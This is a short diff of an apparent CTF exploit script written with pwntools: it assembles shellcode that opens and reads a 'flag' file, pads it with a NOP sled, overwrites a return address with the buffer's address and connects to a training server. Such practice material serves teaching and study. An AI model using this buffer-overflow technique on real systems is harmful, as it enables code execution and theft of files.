@@ -38,11 +38,9 @@ assembler = shellcraft.open("flag") + shellcraft.read('rax', 'rsp', size) + shel
 # print(assembler)
 
 shellcode = asm(assembler)
-# print(f'len(shellcode) = {len(shellcode)}')
 
 # the exploit is made by the true shellcode, a nop sled and an address inside the buffer (in the nop sled)
 exploit = shellcode + b'\x90' * (0x138 - len(shellcode)) + p64(buffer)    # 0x404100 is the address of buffer (global => fixed, plus it's in a NX memory area!)
-# print(exploit)
 
 if args.REMOTE:
     c = remote('forking-server.training.offensivedefensive.it', 8080, ssl=True)
